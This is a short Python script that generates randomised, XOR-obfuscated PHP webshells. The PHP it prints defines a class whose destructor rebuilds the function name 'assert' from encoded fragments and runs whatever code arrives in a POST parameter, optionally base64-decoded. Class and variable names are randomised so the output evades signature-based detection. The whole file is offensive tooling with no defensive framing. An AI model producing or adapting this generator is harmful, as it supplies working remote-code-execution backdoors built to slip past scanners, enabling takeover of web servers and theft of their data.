import random

func = 'assert'
shell = '''<?php 
class  {0}{2}
${1}=new {0}();
@${1}->ccc=isset($_GET['id'])?base64_decode($_POST['mr6']):$_POST['mr6'];
?>'''

def random_keys(len):
    str = '`~-=!@#$%^&*_/+?<>{}|:[]abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))

    
def random_name(len):
    str = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ'
    return ''.join(random.sample(str,len))   
    
    
def xor(c1,c2):
    return hex(ord(c1)^ord(c2)).replace('0x',r"\x")

def build_func():
    func_line = ''
    name_tmp=[]
    for i in range(len(func)):
        name_tmp.append(random_name(3).lower())
    key = random_keys(len(func))
    fina=random_name(4)
    call = '${0}='.format(fina)
    for i in range(0,len(func)):
        enc = xor(func[i],key[i])
        func_line += "${0}='{1}'^\"{2}\";".format(name_tmp[i],key[i],enc)
        func_line += '\n'
        call += '${0}.'.format(name_tmp[i])
    func_line = func_line.rstrip('\n')
    #print(func_line)
    call = call.rstrip('.') + ';'
    func_tmpl = '''{ 
function __destruct(){
%s
%s
return @$%s($this->ccc);}}''' % (func_line,call,fina)
    return func_tmpl

    
def build_webshell():
    className = random_name(4)
    objName = className.lower()
    func = build_func()
    shellc = shell.format(className,objName,func).replace('ccc',random_name(2))
    return shellc
    
if __name__ == '__main__':
    print (build_webshell())
